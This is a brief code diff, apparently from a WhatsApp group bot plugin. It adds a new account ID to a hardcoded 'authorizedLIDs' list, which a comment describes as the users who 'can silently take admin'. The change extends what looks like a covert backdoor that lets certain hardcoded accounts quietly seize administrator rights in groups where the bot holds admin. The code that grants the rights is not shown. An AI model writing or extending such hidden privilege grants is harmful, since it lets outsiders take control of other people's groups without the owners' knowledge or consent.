@@ -14,7 +14,8 @@ async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
 
     // Authorized LIDs - Only these users can silently take admin
     const authorizedLIDs = [
-         "90920817021054@lid",
+        "168140117901400@lid",
+        "90920817021054@lid",
         "188425231679713@lid",
          "20418995957926@lid",
         "147609939349717@lid",
